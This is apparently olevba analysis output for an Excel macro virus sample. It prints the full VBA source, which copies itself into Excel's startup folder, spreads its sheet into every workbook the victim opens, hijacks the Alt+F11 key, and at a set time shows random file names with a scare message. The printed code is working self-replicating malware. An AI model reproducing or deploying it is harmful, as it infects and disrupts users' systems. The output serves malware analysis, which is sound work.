olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.e-c61c677f67b4c384854f9b8d66924cfbfd47d635
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ECSYSTEM.bas 
in file: Virus.MSExcel.Agent.e-c61c677f67b4c384854f9b8d66924cfbfd47d635 - OLE stream: '_VBA_PROJECT_CUR/VBA/ECSYSTEM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()

If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "ECSYSTEM.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("ECSYSTEM").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "ECSYSTEM.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("ECSYSTEM.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "ECSYSTEM.xls!cop"
Application.OnKey "%{F11}", "ECSYSTEM.xls!escape"
If ThisWorkbook.Path = Application.StartupPath Then Application.OnTime TimeValue("16:44:44"), "del"
End Sub
Sub del()
On Error Resume Next
If (Now() - Int(Now())) < TimeValue("16:44:00") Or (Now() - Int(Now())) > TimeValue("16:45:00") Then Exit Sub
Application.FileSearch.LookIn = "C:\Documents and Settings\"
Application.FileSearch.Filename = "*.*"
Application.FileSearch.SearchSubFolders = True
Application.FileSearch.Execute
For x = 1 To 5
i = Int(Rnd * Application.FileSearch.FoundFiles.Count) + 1
Beep
MsgBox Application.FileSearch.FoundFiles(i) & Chr(10) & Chr(10) & "颇老捞 昏力登菌嚼聪促.", Title:="ECSYSTEM"
Next
MsgBox "唤! 烙", Title:="ECSYSTEM"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "ECSYSTEM" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("ECSYSTEM.xls").Sheets("ECSYSTEM").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub escape()
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  ECSYSTE
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

